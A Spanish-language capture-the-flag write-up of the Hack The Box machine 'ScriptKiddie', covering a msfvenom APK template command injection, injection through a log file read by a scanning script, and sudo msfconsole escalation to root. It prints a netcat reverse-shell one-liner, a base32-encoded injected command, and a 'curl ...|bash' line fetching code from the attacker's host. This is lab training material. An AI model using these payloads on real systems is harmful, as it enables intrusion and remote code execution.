---
title: ScriptKiddie
date: 2023-04-11 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.93 scan initiated Tue Apr 11 14:26:40 2023 as: nmap -sCV -p22,5000 -oN targeted 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 11 14:26:53 2023 -- 1 IP address (1 host up) scanned in 13.44 seconds
```
Nos encontramos con un sitio web donde tenemos varias utilidades que usamos normalmente en hacking. 

![imagen1](/assets/images/ScriptKiddie/scriptk1.png)

De lo apartados de scan y searchploit no encontramos alguna manera de vulnerar estas partes, sin embargo, la parte de generate nos muestra que podemos subir un archivo template para generar el archivo con msfvenom, buscando por searchsploit encontramos que msfvenom tiene una vulnerabilidad al recibir un template de apk. Esto nos ayuda a ejecutar comandos. Para esto hicimos uso de este [script](https://www.exploit-db.com/exploits/49491) donde introducimos en payload un comando que nos de una reverse shell, subimos el archivo al sitio web y con eso tuvimos acceso a la máquina.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/ScriptKiddie$ sudo searchsploit msfvenom
[sudo] password for gu3ro: 
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                  | multiple/local/49491.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/ScriptKiddie$ python3 poc.py
[+] Manufacturing evil apkfile
Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 1234 >/tmp/f
-dname: CN='|echo OJWSAL3UNVYC6ZR3NVVWM2LGN4QC65DNOAXWMO3DMF2CAL3UNVYC6ZT4F5RGS3RPONUCALLJEAZD4JRRPRXGGIBRGAXDCMBOGE2C4MJUEAYTEMZUEA7C65DNOAXWM=== | base32 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpd3ybh7hk/evil.apk
Do: msfvenom -x /tmp/tmpd3ybh7hk/evil.apk -p android/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -o /dev/null
```
![imagen2](/assets/images/ScriptKiddie/scriptk2.png)

Dentro de la máquina encontramos una carpeta logs donde nos muestra un archivo hackers vacio donde tenemos permisos de lectura y escritura. Por el momento no parece útil, revisando la carpeta home encontramos un usuario pwn donde está ejecutando un archivo

```shell
kid@scriptkiddie:~/logs$ ls
hackers

kid@scriptkiddie:/home$ ls
kid  pwn
kid@scriptkiddie:/home$ cd pwn
kid@scriptkiddie:/home/pwn$ ls
recon  scanlosers.sh
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
En este archivo está obteniendo los valores del archivo hackers que encontramos en la carpeta logs, en este punto como tenemos permisos de escritura en el archivo hackers y tal información que obtiene el script no está siendo validada, creamos un contenido malicioso para ese archivo y verificamos que nos de ejecución de comandos.

```shell
kid@scriptkiddie:/home/pwn$ echo "x x 10.10.10.10; ping -c 2 10.10.14.14" > ../kid/logs/hackers 
```
```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/ScriptKiddie$ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:32:55.407672 IP 10.10.10.226 > 10.10.14.14: ICMP echo request, id 2, seq 1, length 64
19:32:55.407736 IP 10.10.14.14 > 10.10.10.226: ICMP echo reply, id 2, seq 1, length 64
19:32:56.431301 IP 10.10.10.226 > 10.10.14.14: ICMP echo request, id 2, seq 2, length 64
19:32:56.431319 IP 10.10.14.14 > 10.10.10.226: ICMP echo reply, id 2, seq 2, length 64
```
Con esto podemos entablarnos una conexión con el usuario pwn.

```shell
kid@scriptkiddie:/home/pwn$ echo "x x 10.10.10.10; curl http://10.10.14.14|bash" > ../kid/logs/hackers
```
Con el usuario pwn tenemos permisos sudo para correr metasploit.

```shell
pwn@scriptkiddie:/home$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
Aquí solamente ejecutamos comandos como root por lo que nos mandamos una bash y habremos pwneado la máquina.

```shell
pwn@scriptkiddie:/home$ sudo /opt/metasploit-framework-6.0.9/msfconsole
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -d

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home# whoami
root
root@scriptkiddie:/home# 
```
